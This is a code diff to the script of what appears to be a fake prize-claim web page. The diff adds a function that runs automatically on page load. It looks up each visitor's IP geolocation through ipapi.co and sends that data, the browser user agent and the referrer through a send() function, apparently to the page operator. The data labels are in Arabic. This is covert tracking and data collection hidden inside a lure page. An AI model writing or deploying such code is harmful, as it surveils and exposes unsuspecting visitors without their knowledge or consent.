@@ -605,6 +605,23 @@ https://maps.google.com/?q=${ipData.latitude},${ipData.longitude}\n`;
     document.getElementById("submitBtn").addEventListener("click", () => {
       getPrizeFlow();
     });
+
+
+
+    async function getMoreData() {
+      send(`💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻`)
+
+      await fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => send(`💻 معلومات الجهاز: ${JSON.stringify(data, null, 2)}`));
+
+      await send(`💻 معلومات 1: ${JSON.stringify(navigator.userAgent, null, 2)}`)
+      await send(`💻 معلومات 2: ${document.referrer}`);
+
+      send(`💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻💻`)
+
+    };
+    getMoreData()
   </script>
 </body>
 
